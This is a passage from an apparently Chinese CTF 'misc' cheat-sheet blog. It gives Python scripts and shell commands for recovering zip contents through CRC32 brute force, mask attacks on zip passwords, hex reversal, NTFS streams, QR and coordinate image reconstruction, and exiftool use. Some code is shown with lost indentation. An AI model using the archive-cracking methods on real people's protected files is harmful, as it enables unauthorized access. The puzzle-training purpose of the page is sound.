class="number">0x70659eff</span>,<span class="number">0x90b077e1</span>,<span class="number">0x6abf4a82</span>]</span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> crc <span class="keyword">in</span> c:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> crc==(binascii.crc32(i.encode())&amp;<span class="number">0xffffffff</span>):</span><br><span class="line">            password =password + i</span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure><p>自动提取文件的CRC值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s=string.printable</span><br><span class="line">f = zipfile.ZipFile(<span class="string">&quot;flag.zip&quot;</span>)</span><br><span class="line">l = f.namelist()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;.txt&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">            <span class="keyword">if</span>(f.getinfo(i).CRC==binascii.crc32(j.encode())):</span><br><span class="line">                print(j)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span>(<span class="params">crc</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span>():</span></span><br><span class="line">    <span class="keyword">for</span> I <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">&#x27;123/out&#x27;</span> + str(I) + <span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">        f = zipfile.ZipFile(file, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">&#x27;data.txt&#x27;</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">&#x27;+/=&#x27;</span></span><br><span class="line">f = open(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h4 id="crc32-py"><a href="#crc32-py" class="headerlink" title="crc32.py"></a>crc32.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">python3 crc32.py reverse <span class="number">0x15b89588</span></span><br><span class="line"><span class="number">4</span> bytes: &#123;<span class="number">0xc9</span>, <span class="number">0xbf</span>, <span class="number">0xd6</span>, <span class="number">0x30</span>&#125;</span><br><span class="line">verification checksum: <span class="number">0x15b89588</span> (OK)</span><br><span class="line">alternative: AKjKcy (OK)</span><br><span class="line">alternative: BVptH1 (OK)</span><br><span class="line">alternative: FRmuIR (OK)</span><br><span class="line">alternative: Ka6j7X (OK)</span><br><span class="line">alternative: ND4JDn (OK)</span><br><span class="line">alternative: SgZWO3 (OK)</span><br><span class="line">alternative: WcGVNP (OK)</span><br><span class="line">alternative: _iQ5Bx (OK)</span><br><span class="line">alternative: bYCMs4 (OK)</span><br><span class="line">alternative: c5qQli (OK)</span><br><span class="line">alternative: d093GV (OK)</span><br><span class="line">alternative: oKFBdr (OK)</span><br><span class="line">alternative: shint6 (OK)//敏感字符</span><br><span class="line">alternative: wltouU (OK)</span><br></pre></td></tr></table></figure><p>会列举出文件内容，这时候我们需要找到敏感字符。</p><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>使用暴力破解的时候，如果我们无法载入文件，如图</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/10.png" alt="10"></p><p>我们可以使用winRAR工具进行压缩包修复。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/11.png" alt="11"></p><h4 id="掩码攻击"><a href="#掩码攻击" class="headerlink" title="掩码攻击"></a>掩码攻击</h4><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/9.png" alt="9"></p><h3 id="关于压缩包的十六进制"><a href="#关于压缩包的十六进制" class="headerlink" title="关于压缩包的十六进制"></a>关于压缩包的十六进制</h3><h4 id="十六进制反序"><a href="#十六进制反序" class="headerlink" title="十六进制反序"></a>十六进制反序</h4><p>使用脚本反序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&#xx27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(steady_str),<span class="number">4</span>):</span><br><span class="line">    steady_str1=steady_str[i:i+<span class="number">4</span>]</span><br><span class="line">    steady_str2=steady_str1[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    steady_str3=steady_str1[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">    flag+=steady_str3+steady_str2</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>直接使用winhex反序</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/12.png" alt="12"></p><h4 id="十六进制异或"><a href="#十六进制异或" class="headerlink" title="十六进制异或"></a>十六进制异或</h4><p>题目会提示<code>0ff</code>，十六进制与<code>0xff</code>异或。</p><p>使用脚本异或、或者winhex功能(如上)。</p><h3 id="压缩包中藏有数据"><a href="#压缩包中藏有数据" class="headerlink" title="压缩包中藏有数据"></a>压缩包中藏有数据</h3><h4 id="01editoer"><a href="#01editoer" class="headerlink" title="01editoer"></a>01editoer</h4><p>使用该软件打开如果提示载入错误，说明该压缩包藏有文件。使用binwalk等等进行分离。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/15.png" alt="15"></p><h3 id="压缩包NTFS隐写"><a href="#压缩包NTFS隐写" class="headerlink" title="压缩包NTFS隐写"></a>压缩包NTFS隐写</h3><p>压缩包也可能会有NTFS隐写，使用win命令<code>dir /r</code>或者<code>lads.exe</code>查看是否有NTFS隐写。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1、有时候压缩包打不开、压缩包有密码，可以直接使用<code>rar</code>进行解压，如果要求输入密码可以直接空密码就可以解压出文件。</p><p>2、压缩包如果有注释，winhex中的ascii会有CMT字段。</p><h2 id="画图"><a href="#画图" class="headerlink" title="画图"></a>画图</h2><h3 id="三坐标画图"><a href="#三坐标画图" class="headerlink" title="三坐标画图"></a>三坐标画图</h3><p>判断坐标大小，求出图片的长度和宽度。</p><p>首先notepad++求行号。</p><p>其次python脚本求图片大小。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">61366</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line"><span class="keyword">if</span> (i*j)==a:</span><br><span class="line">print(i,j)</span><br><span class="line">(<span class="number">122</span>, <span class="number">503</span>)</span><br><span class="line">(<span class="number">503</span>, <span class="number">122</span>)</span><br></pre></td></tr></table></figure><p>然后脚本画图。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x=<span class="number">503</span></span><br><span class="line">y=<span class="number">122</span></span><br><span class="line"></span><br><span class="line">img=Image.new(<span class="string">&quot;RGB&quot;</span>,(x,y))</span><br><span class="line">file1=open(<span class="string">&#x27;./1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</span><br><span class="line">        line=file1.readline().replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        print(line)</span><br><span class="line">        img.putpixel((i,j),(int(line[<span class="number">0</span>]),int(line[<span class="number">1</span>]),int(line[<span class="number">2</span>])))</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure><h3 id="01二维码"><a href="#01二维码" class="headerlink" title="01二维码"></a>01二维码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX = <span class="number">25</span></span><br><span class="line">img = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX,MAX))</span><br><span class="line">str=<span class="string">&quotquot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range (<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range (<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(str[i] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            img.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">img.show()</span><br><span class="line">img.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>使用kali工具扫描二维码拿到flag，如果二维码太小，可以放大截图，然后继续扫描。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ zbarimg &quot;&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;1.png&quot; &gt;&gt; 1.txt</span><br></pre></td></tr></table></figure><p><code>QR-Code:flag&#123;bin_2_qrcode&#125;</code></p><h3 id="分割图片批量扫描二维码"><a href="#分割图片批量扫描二维码" class="headerlink" title="分割图片批量扫描二维码"></a>分割图片批量扫描二维码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">id = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">25</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">25</span>):</span><br><span class="line">        box = (<span class="number">25</span> * i, <span class="number">25</span> * j, <span class="number">25</span> * (i + <span class="number">1</span>), <span class="number">25</span> * (j + <span class="number">1</span>))</span><br><span class="line">        im.crop(box).resize((<span class="number">500</span>, <span class="number">500</span>), Image.ANTIALIAS).save(<span class="string">&#x27;C:/Users/12521/Desktop/CTF脚本/图片二维码/分割二维码/1/%03d.png&#x27;</span> % id)</span><br><span class="line">        id += <span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ <span class="keyword">for</span> i <span class="keyword">in</span> &#123;<span class="number">0.</span><span class="number">.624</span>&#125;;do zbarimg <span class="string">&quot;./$i.png&quot;</span>;done &gt;&gt; qr.txt</span><br></pre></td></tr></table></figure><h3 id="上下左右画图"><a href="#上下左右画图" class="headerlink" title="上下左右画图"></a>上下左右画图</h3><p><code>R-right  L-left  U-up  D-down</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">s=<span class="string">&#x27;DDDDDDDDDRRRRRRDDDDDDDDDDDDDDDDLLLDDDDDDDDDDDLLRRRRLLDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRRUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDRRRRRRLDDDDDDDDDDDDDLLLLLLLRRRRRRRRLUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUUURRLLDDDDDDDDDDDDDDDDDDDDDDLLDDDDRRDDDDDDDDDDDDDDDDDDDDDDDRRLLUUUUUUUUUUUUUUUUUUUUUUULLUUUURRUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRDDDDDDDDDDDDDDDDDDDDDDRRRRRLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDRRRUUUUUUUUUUUUUUUURRRRLLLLDDDDDDDDDDDDDDDDRRRRDDDDDDDDDDDDDDDDDDDDDDLLLLRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRUUUUUUUUUUUUUUUUUUUUULLLRRRDDDDDDDDDDDDDDDDDDDDDDDDRRDDDDLLDDDDDDDDDDDDDDDDDDDDLLL&#x27;</span></span><br><span class="line">flag =np.zeros((<span class="number">199</span>,<span class="number">100</span>))</span><br><span class="line">x=<span class="number">0</span></span><br><span class="line">y=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line"><span class="keyword">if</span>(s[i]==<span class="string">&#x27;D&#x27;</span>):</span><br><span class="line">y=y+<span class="number">1</span></span><br><span class="line">flag[x][y]=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">elif</span>(s[i]==<span class="string">&#x27;U&#x27;</span>):</span><br><span class="line">y=y<span class="number">-1</span></span><br><span class="line">flag[x][y]=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">elif</span>(s[i]==<span class="string">&#x27;R&#x27;</span>):</span><br><span class="line">x=x+<span class="number">1</span></span><br><span class="line">flag[x][y]=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">elif</span>(s[i]==<span class="string">&#x27;L&#x27;</span>):</span><br><span class="line">x=x<span class="number">-1</span></span><br><span class="line">flag[x][y]=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">f = open(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">199</span>):</span><br><span class="line"><span class="keyword">if</span>(str(flag[z][j])==<span class="string">&#x27;0.0&#x27;</span>):</span><br><span class="line">s+=<span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">s+=<span class="string">&#x27;x&#x27;</span></span><br><span class="line">f.write(s)</span><br><span class="line">f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.close</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">1000</span>,<span class="number">1000</span>),<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line"> <span class="comment">#把flag中的字母读出来</span></span><br><span class="line">line = <span class="string">&quot;DDDDDDDDDRRRRRRDDDDDDDDDDDDDDDDLLLDDDDDDDDDDDLLRRRRLLDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRRUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDRRRRRRLDDDDDDDDDDDDDLLLLLLLRRRRRRRRLUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUUURRLLDDDDDDDDDDDDDDDDDDDDDDLLDDDDRRDDDDDDDDDDDDDDDDDDDDDDDRRLLUUUUUUUUUUUUUUUUUUUUUUULLUUUURRUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRDDDDDDDDDDDDDDDDDDDDDDRRRRRLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDRRRUUUUUUUUUUUUUUUURRRRLLLLDDDDDDDDDDDDDDDDRRRRDDDDDDDDDDDDDDDDDDDDDDLLLLRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRUUUUUUUUUUUUUUUUUUUUULLLRRRDDDDDDDDDDDDDDDDDDDDDDDDRRDDDDLLDDDDDDDDDDDDDDDDDDDDLLL&quot;</span></span><br><span class="line">a = [<span class="number">300</span>,<span class="number">300</span>] <span class="comment">#起始位置</span></span><br><span class="line"><span class="comment">#把flag[0]当做左右移动 flag[1]当做上下移动</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> line:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">        a[<span class="number">1</span>] = a[<span class="number">1</span>]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;U&#x27;</span>:</span><br><span class="line">        a[<span class="number">1</span>] = a[<span class="number">1</span>]<span class="number">-1</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">        a[<span class="number">0</span>] = a[<span class="number">0</span>]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">        a[<span class="number">0</span>] = a[<span class="number">0</span>]<span class="number">-1</span></span><br><span class="line">    im.putpixel(a ,(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>)) <span class="comment">## putpixel是通过坐标点来进行画图</span></span><br><span class="line"><span class="comment">##刚开始是按照惯例 让i == &#x27;u&#x27; +1 画出来是个倒立的图形 所以只能让 ‘D&#x27;+1</span></span><br><span class="line">print(a)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><h3 id="二坐标画图"><a href="#二坐标画图" class="headerlink" title="二坐标画图"></a>二坐标画图</h3><p>kali的<code>gnuplot</code>,主要该工具去需要去掉<code>（）</code>、以及逗号变成空格。</p><p>python脚本。</p><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><h3 id="compare"><a href="#compare" class="headerlink" title="compare"></a>compare</h3><p>比较两张图片是否有异同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compare &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;1.png&#39;  &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;2.png&#39;  out.png</span><br></pre></td></tr></table></figure><p>查看得到的图片有什么异常。</p><h3 id="diif"><a href="#diif" class="headerlink" title="diif"></a>diif</h3><p>比较两张图片的不同，并显示十六进制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff -a a.jpg b.jpg|hexdump -C</span><br></pre></td></tr></table></figure><h3 id="wbs43open"><a href="#wbs43open" class="headerlink" title="wbs43open"></a>wbs43open</h3><p>bmp文件解密。</p><h3 id="hexdump"><a href="#hexdump" class="headerlink" title="hexdump"></a>hexdump</h3><p>查看文件十六进制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C flag.png</span><br></pre></td></tr></table></figure><h3 id="webp"><a href="#webp" class="headerlink" title="webp"></a>webp</h3><ul><li><code>cwebp</code> - 编码器工具：可将 <code>png</code> 转为 <code>webp</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cwebp 1.png -o 2.webp</span><br></pre></td></tr></table></figure><ul><li><code>dwebp</code> - 解码器工具：可将 <code>webp</code> 转为 <code>png</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dwebp 1.webp -o 2.png</span><br></pre></td></tr></table></figure><ul><li><code>vwebp</code> - 查看器工具：可直接查看 <code>webp</code> 格式图片</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vwebp 1.webp</span><br></pre></td></tr></table></figure><ul><li><code>webpinfo</code> - 格式查看工具：可打印出 <code>WebP</code> 文件的块级结构以及基本完整性检查</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webpinfo 1.webp</span><br></pre></td></tr></table></figure><h3 id="exiftools"><a href="#exiftools" class="headerlink" title="exiftools"></a>exiftools</h3><h4 id="查看图片元数据"><a href="#查看图片元数据" class="headerlink" title="查看图片元数据"></a>查看图片元数据</h4><p>可以查看图片信息–数据可以包括诸如相机型号，闪光灯是否闪光，日期，时间甚至GPS坐标之类的信息。</p><p>比较重要的数据为<code>XP Comment</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool flag.jpg</span><br></pre></td></tr></table></figure><h4 id="批量提取元数据"><a href="#批量提取元数据" class="headerlink" title="批量提取元数据"></a>批量提取元数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool * | grep &quot;flag&quot;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">imgs = os.listdir(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">print(imgs)</span><br><span class="line">imgs = [img <span class="keyword">for</span> img <span class="keyword">in</span> imgs <span class="keyword">if</span> <span class="string">&#x27;.jpg&#x27;</span> <span class="keyword">in</span> img]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> img <span class="keyword">in</span> imgs:</span><br><span class="line">    exif_dict = dict()</span><br><span class="line"><span class="comment">#   img=re.sub(r&#x27;[(|)]&#x27;,&#x27;&#x27;,img)</span></span><br><span class="line">    exif = os.popen(<span 